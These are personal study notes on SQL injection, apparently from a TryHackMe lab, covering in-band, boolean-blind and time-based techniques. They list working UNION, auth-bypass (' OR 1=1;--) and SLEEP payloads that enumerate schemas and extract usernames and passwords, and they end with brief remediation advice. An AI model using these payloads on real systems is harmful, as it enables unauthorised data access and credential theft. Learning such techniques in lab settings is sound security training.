# SQL injection

1. in-band
2. blind
3. out-of-band

In-band:
- exploit and return data from database

Error based SQL injection:
- to obtain information
- used to enumurate a whole database

Union based:
- utilized UNION along with Select

1 union select 1,2,3
0 union select 1,2,3

0 union select 1,2,database() - sqli-one

> 0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'

> https://website.thm/article?id=0 union select 1,2,group_concat(column_name) from information_schema.columns where table_name = 'staff_users';
> https://website.thm/article?id=0 union select 1,2,group_concat(username,':',password SEPARATOR '<br>') from staff_users;


**Blind**
- ' OR 1=1;--   -> enter this in the password field

**blind - boolean based**
- https://website.thm/checkuser?username=admin
- {taken: true}

> https://website.thm/checkuser?username=admin123' union select 1,2,3 where database() like 's%';--
> https://website.thm/checkuser?username=admin123' union select 1,2,3 from information_schema.tables where table_schema = 'sqli_three' and table_name like '%';--
> https://website.thm/checkuser?username=admin123' union select 1,2,3 from information_schema.tables where table_schema = 'sqli_three' and table_name like 'users';--
>
> https://website.thm/checkuser?username=admin123' union select 1,2,3 from information_schema.COLUMNS where table_schema = 'sqli_three' and table_name = 'users' and column_name like '%';--
> https://website.thm/checkuser?username=admin123' union select 1,2,3 from information_schema.COLUMNS where table_schema = 'sqli_three' and table_name = 'users' and column_name like 'id';--
>
> https://website.thm/checkuser?username=admin123' union select 1,2,3 from information_schema.COLUMNS where table_schema = 'sqli_three' and table_name = 'users' and column_name like 'u%' and column_name !='id';--
>
> https://website.thm/checkuser?username=admin123' union select 1,2,3 from users where username like 'a%';--
> admin
>
> https://website.thm/checkuser?username=admin123' union select 1,2,3 from users where username = 'admin' and password like 'a%';--
> https://website.thm/checkuser?username=admin123' union select 1,2,3 from users where username = 'admin' and password like '3%';--    -> true



**Blind SQLi - time based**
- using SLEEP(x) method in UNION statement
  > https://website.thm/analytics?referrer=admin123' union select sleep(5);--
  > https://website.thm/analytics?referrer=admin123' union select sleep(5),2 where database() = 'sqli_four';--   sucecss
  > https://website.thm/analytics?referrer=admin123' union select sleep(5),2 from users where username like 'admin';--
  > https://website.thm/analytics?referrer=admin123' union select sleep(5),2 from users where username = 'admin' and password = '4961';--  - success
  

**out of band**
- 2 channel requests
- http/dns requests

**Remediation**
- prepared statements with parametarized queires
- input validation - allow list , deny list , strings replacing methods, fileters
- escaping user input - characters such as ' " $\ 
